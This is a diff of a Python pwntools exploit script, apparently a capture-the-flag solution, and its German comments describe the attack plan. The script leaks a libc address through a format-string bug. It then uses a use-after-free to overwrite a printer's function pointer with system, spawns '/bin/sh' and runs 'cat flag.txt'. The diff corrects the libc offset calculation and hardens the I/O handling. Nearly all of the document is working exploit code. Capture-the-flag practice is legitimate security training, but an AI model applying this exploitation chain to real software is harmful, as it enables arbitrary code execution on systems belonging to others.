@@ -27,69 +27,63 @@ def start(argv=[], *a, **kw):
 # if one is able to overwrite the address of the print function to system, that will be executed
 #this is done here
 
+# Spartak: FIXED Seans Task:
+# - libc calc was wrong ==> system addr was wrong
+# - packing etc. easier 
+# - recvuntil more errorprone 
+
+# Theorie:
+# - erstelle printer mit der print_plain Methode ==> die hat nen Format String Exploit (raw) ; 1
+# - setze den printer auf den "Main printer" (Pointer!) ; 3
+# - Format String Exploit ==> leak libc Base (Auf dem Stack ne libc addresse mit %p) offset via gdb; 6
+# - delete printer, ABER: der Pointer zeigt noch auf den printer der jetzt befreit ist! ==> UAF!; 2
+# - mache einen User mit system als name, wird auf dem GLEICHEN Block allokiert wie der Printer! ==> Kann die Adresse die im Printer steht nutzen; 4
+# - print your message "/bin/sh", pointer zeigt noch auf den alten printer der jetzt der user ist aka system und als Parameter wird "/bin/sh" übergeben
+# ==> PROFIT eZ
+
+
 def main():    
     io = start()
-    libc = ELF(exe.libc.path, checksec=False)
-    system = libc.sym['system'] #address of system
-    libc_b = libc.sym['__libc_start_main'] # address of libc base
+    libc = exe.libc
 
-
-    io.recv()
+    io.recvuntil(b">>")
     io.sendline(b'1')   #create Printer with plain print function
-    io.recv()
+    io.recvuntil(b":")
     io.sendline(b'2') # set plain function
-    io.recv()
+    io.recvuntil(b">>")
 
     io.sendline(b'3') # set printer as current printer
-    io.recv()
+    io.recvuntil(b":")
     io.sendline(b'0')
-    io.recv()
-    found = False
-    while found is False:
-        io.sendline(b'6') # use format string to leak addresses
-        io.recv()
-        io.sendline(b'%147$p') # leak address of __libc_start_main+243
-        ret = io.recv()
-        #print(ret)
-        all = re.findall(b'\n\n\n.+?\n\n\n', ret) # extract address
-        if all:
-            found = True
-
-    for i in range(len(all)):
-        try:
-            libc243=all[i].replace(b'\n\n\n',b'')
-        except:
-            pass
-
-    io.sendline(b'6') # use format string to leak addresses
-    io.recv()
+    io.recvuntil(b">>")
+    io.sendline(b"6")
+    io.recvuntil(b":")
     io.sendline(b'%147$p') # leak address of __libc_start_main+243
-    ret = io.recv()
+    addr = io.recvuntil(b">>")[4:18]
 
-    offset = (int(libc243,16)-int('f3',16)-libc_b) # calculate offset (ASLR)
+    libc.address = int(addr, 16) - libc.sym["__libc_start_call_main"] - 128
 
-    system += offset    #calculate address of system using offset
-    system = p64(system)
+    system = p64(libc.sym.system)
 
     io.sendline(b'2') # delete printer for use after free
-    io.recv()
+    io.recvuntil(b":")
     io.sendline(b'0')
-    io.recv()
+    io.recvuntil(b">>")
 
     io.sendline(b'4') # create user
-    io.recv()
+    io.recvuntil(b":")
     io.sendline(system) # user name is address of system
-    io.recv()
+    io.recvuntil(b">>")
 
     io.sendline(b'6')   # print message
-    io.recv()
-    #io.interactive()
+    io.recvuntil(b":")
     io.sendline(b'/bin/sh') # message is /bin/sh
 
-    #io.interactive()
+    io.recv(timeout=0.5)
+
     io.sendline(b'cat flag.txt') # print flag
-    flag = io.recv()
-    print(flag.decode('utf-8')[:-1])
+    flag = io.recvuntil(b"}")
+    print(flag.decode('utf-8')[:])
 
 if __name__ == "__main__":
     main()
